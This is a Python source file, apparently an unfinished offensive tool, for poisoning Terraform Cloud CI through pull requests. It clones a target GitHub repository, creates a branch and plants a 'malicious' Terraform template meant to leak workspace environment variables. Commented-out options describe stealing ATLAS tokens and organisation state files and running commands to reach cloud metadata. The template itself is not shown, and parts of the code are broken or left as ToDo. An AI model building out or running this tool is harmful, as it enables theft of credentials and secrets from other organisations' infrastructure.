# Commands we used to do it manually:
# python3 PR_attack.py --repo https://github.com/user/repo/ -- folder/ --get_envs
# git clone FULL_REPO # https://github.com/user/repo/
# cd REPO  # repo
# git checkout -b SEC-0000

# import os
# cwd = os.path.dirname(os.path.realpath(__file__)))
# cp templates/get_all_envs.tf FOLDER/template_instance000.tf
# git add FOLDER/template_instance000.tf
# git commit -m "Testing CI"
# git push origin SEC-0000
# Show to the user the URL to create a Github PR
# ToDo: Format of this URL

import argparse
import os
import subprocess
#from terrasnek.api import TFC
#import terrasnek.exceptions
import json
from string import Template
import tempfile
import shutil
import glob
import re

TMP_BRANCH = "SEC-0000"

# It checks if the terraform binary is present in the system
def check_git_binary():
    try:
        output = subprocess.check_output("git --version".split())
        output = output.decode('ascii')
        print("[+] Found git client, %s" % output.split('\n')[0])
        return True
    except FileNotFoundError as f:
        return False

# It creates a temporal folder that will be used to clone the target repository and add the malicious tf code
def setup_temp_folder(repo):
    tmp_folder = tempfile.mkdtemp()
    print(f"[+] Created temporal folder {tmp_folder}")


    # First we clone the repository
    print("[+] Cloning repository {repo}")
    output = subprocess.check_output(f"git clone {repo} {tmp_folder}")
    output = output.decode('ascii')
    if not "done" in output:
        print(f"[!] It seems like there is some issue cloning the repo you provided, check it manually:\ngit clone {repo}")
        shutil.rmtree(tmp_folder)
        exit(-1)

    # Second, we create a branch to add the malicious files
    print("[+] Creating branch {TMP_BRANCH}")
    os.chdir(tmp_folder)
    subprocess.check_output(f"git checkout -b {TMP_BRANCH}")
    
    return tmp_folder

def get_all_envs(tmp_folder):
    # Copying template to temp folder
    src_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "templates/get_all_envs.tf")
    # We use a name that is generic but unique
    dst_file = os.path.join(tmp_folder, "template_instance000.tf")
    shutil.copy(src_file, dst_file)
    
    # ToDo: git add


def parse_args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('--repo', type=str, help="Github repository that is going to be targeted", required=True)
    arg_parser.add_argument('--folder', type=str, help="Folder containing the terraform files", required=True)
    arg_parser.add_argument('--get_envs', action='store_true', help="It gets the environment variables from the TF workspaces")
    #arg_parser.add_argument('--get_state_file', type=str, help="It gets the state file just doing a plan, useful when the ATLAS TOKEN doesn't have permissions to access the state file")
    #arg_parser.add_argument('--get_all_state_files_from_org', type=str, help="Gets the ATLAS TOKEN used during a speculative run (plan), and abuse the implicit permissions to get the state files of all workspaces in the organization")
    #arg_parser.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
    return arg_parser.parse_args()

def main():
    args = parse_args()
    if not check_git_binary():
        print("git binary not found in your system")
        exit(-1)

    # Create a temp folder to use it during the attack
    tmp_folder = setup_temp_folder(args.repo)

    if args.get_envs:
        get_all_envs(tmp_folder)

    print("Visit the following URL to send a PR that will trigger the TF")
    # Show to the user the URL to create a Github PR

    # ToDo: Tell the user to check for the output
    # ToDo : Ask user if he/she wants to rewrite history to delete what we did
    # (Do that only after the PR has been submmited) 
    rewrite_history()

    answer = input("Would you like to delete the temporal folder? Y/n")
    # Remove temporal folder
    if answer.lower().strip() == "y":
        shutil.rmtree(tmp_folder)

if __name__ == "__main__":
    main()